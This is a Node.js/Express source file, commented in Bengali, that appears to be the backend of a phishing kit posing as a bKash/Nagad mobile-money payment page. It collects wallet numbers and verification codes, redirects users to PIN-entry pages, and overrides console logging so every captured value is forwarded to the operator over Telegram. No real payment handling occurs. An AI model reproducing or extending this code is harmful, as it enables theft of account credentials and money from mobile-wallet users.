
// .env ফাইল থেকে environment variables লোড করবে
require('dotenv').config();

// telegram.js থেকে notifyTelegram ফাংশন ইমপোর্ট করো
const notifyTelegram = require('./mysite/msg');
const originalLog = console.log;
const originalError = console.error;

console.log = (...args) => {
  originalLog(...args);
  notifyTelegram(`📘 LOG: ${args.join(' ')}`);
};

console.error = (...args) => {
  originalError(...args);
  notifyTelegram(`❗ ERROR: ${args.join(' ')}`);
};
// নিচের দুইটা লাইনে console.log আর console.error override হয়ে Telegram-এ মেসেজ যাবে

console.log("🚀 Server started successfully!");
console.error("❌ Warning: Something went wrong!");

// সরাসরি notifyTelegram কল করেও মেসেজ পাঠাতে পারো
notifyTelegram("👋 এই মেসেজটা সরাসরি index.js থেকে Telegram এ পাঠানো হলো।");





const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Body parser middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files (like HTML, images, etc.)
app.use(express.static(path.join(__dirname, 'mysite')));

// Handle POST request from payment form
app.post('/submit-payment', (req, res) => {
  const bkashNumber = req.body['bkash-number'];
  const nagadNumber = req.body['nagad-number'];
  const uid = req.body.uid;
  const price = req.body.price;

  console.log('=== Payment Received ===');
  console.log('UID:', uid);
  console.log('Price:', price);

  if (bkashNumber) {
    console.log('bKash Number:', bkashNumber);
    res.redirect(`/verify-bkash.html?uid=${uid}&price=${price}`);
  } else if (nagadNumber) {
    console.log('Nagad Number:', nagadNumber);
    res.redirect(`/verify-nagod.html?uid=${uid}&price=${price}`);
  } else {
    console.log('No payment number provided!');
    res.send('No payment number provided!');
  }
});

// Handle POST request from verify page
app.post('/verify', (req, res) => {
  const code = req.body.code;
  const uid = req.body.uid;
  const price = req.body.price;
  const method = req.body.method; // frontend থেকে method পাঠাতে হবে

  console.log('Received verification code:', code);
  console.log('Method:', method);

  if (method === 'bkash') {
    res.redirect(`/bikash-pin.html?uid=${uid}&price=${price}`);
  } else if (method === 'nagad') {
    res.redirect(`/nagod-pin.html?uid=${uid}&price=${price}`);
  } else {
    res.send('Invalid payment method!');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
